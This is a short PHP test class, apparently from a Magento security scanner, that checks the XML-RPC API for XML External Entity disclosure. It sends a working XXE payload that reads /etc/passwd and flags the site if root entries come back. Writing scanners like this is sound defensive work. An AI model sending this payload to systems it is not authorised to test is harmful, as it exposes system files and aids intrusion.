<?php
namespace bysoft\tests\magento;

class Xml_Rpc_Disclosure extends \bysoft\code\generic\XmlRpc_Disclosure {
    public function run(){
        $this->status = self::STATUS_RUNNING;
        $this->errMessage = "XMLRPC DISCLOSURE\r\n";
        $request = $this->postString(\bysoft\Tester::$config['url'].'api/xmlrpc','<?xml version="1.0"?><!DOCTYPE foo [ <!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>');
        
        if(strpos($request->getResponse()->getContent(),':root:')!==false){
            $this->errMessage .= "\t".'/etc/passwd was read !'."\r\n";
            $this->status = self::STATUS_FAIL;
        }else{
            $this->status = self::STATUS_OK;
        }
        return $this->status;
    }
}